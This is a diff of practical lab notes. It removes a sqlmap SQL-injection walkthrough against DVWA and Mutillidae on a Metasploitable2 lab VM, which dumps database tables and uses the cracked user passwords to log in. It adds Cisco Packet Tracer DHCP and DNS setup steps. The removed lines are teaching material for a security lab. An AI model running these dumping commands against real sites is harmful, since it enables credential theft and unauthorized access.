@@ -1,67 +1,20 @@
-prac7
+Practical - 8
+LOAD PC-PT
+LOAD WRT300N
+LOAD LAPTOP-PT
+LOAD CABLE-Modem-PT
+LOAD Cloud-PT
+Load Server-PT
 
-Run metasploitable2 and Kali Linux and check the Ip address of metasploitable2
-
-Type the metasploitable2 ip address on the browser
-
-Select the Mutillidae option
-
-sqlmap -h
-
-#DVWA
-sqlmap -u ‘the link of the login page’ –dbs –dump --batch
-
-Type Y for all the Questions.
-It will take quite a while for the process to complete as it is checking the vulnerabilities 
-You will get the following error(WARNING).
-
-sudo nano /var/www/Mutillidae/config.inc
-change the “dbname” to owasp10
-
-sqlmap -u 
-'http://192.168.37.130/mutillidae/index.php?page=userinfo.php&username=admin&p 
-assword=password&user-info-php-submit-button=View+Account+Details' --dbs
-
-sqlmap -u 
-'http://192.168.37.130/mutillidae/index.php?page=userinfo.php&username=admin&p 
-assword=password&user-info-php-submit-button=View+Account+Details' -D dvwa - -
-tables
-
-Select the ‘0’ Injection point to view the tables
-
-sqlmap -u 
-'http://192.168.37.130/mutillidae/index.php?page=userinfo.php&username=admin&p 
-assword=password&user-info-php-submit-button=View+Account+Details' -D dvwa - T users 
---columns
-
-sqlmap -u 
-'http://192.168.37.130/mutillidae/index.php?page=userinfo.php&username=admin&p 
-assword=password&user-info-php-submit-button=View+Account+Details' -D dvwa - T users 
---dump
-
-you can see all the 
-passwords for every user that is present in the DVWA database
-
-Enter one of the cracked username and passwords on the DVWA website and you will be 
-able to log in
-
-After entering the cracked credentials, you should have access to the main page of the 
-DVWA website
-
-#Mutillidae
-Evaluate the same SQL Injection with the Mutillidae website
-
-sqlmap -u 'http://192.168.37.130/mutillidae/index.php?page=userinfo.php&username=admin& 
-password=password&user-info-php-submit-button=View+Account+Details' --dbs
-
-sqlmap -u 
-'http://192.168.37.130/mutillidae/index.php?page=userinfo.php&username=admin&p 
-assword=password&user-info-php-submit-button=View+Account+Details' -D owasp10 -T 
-accounts --dump
-
-we can see all the cracked passwords of every user mentioned in the accounts table
-
-Now we will use one of these credentials, to log into the Mutillidae website
-
-
-
+- Set PC0 IpAddress using DHCP
+- Server Ip Address Setup >IP:  208.67.220.220, Default Gateway: 208.67.220.1
+- Go to Router DHCP server settings > Static DNS 1 - 208.67.220.220
+- Configure Cisco Server DHCP > Service on > Default Gateway: 208.67.220.220 DNS SERVER:  208.67.220.220, MAX USERS: 50 > Click on Add
+- Configure server dns > cisco.com , ip address:  208.67.220.220, click on add
+- Configure cloud > Ethernet 6 : select cable> go to cable tab> add coaxial7 <> ethernet 6
+- Server settings > static ip : DNS-server: 208.67.220.220
+- Verify Connectivitiy
+- check pc ip ipconfig
+- ipconfig /release
+- ipconig /renew
+- ping 208.67.220.220
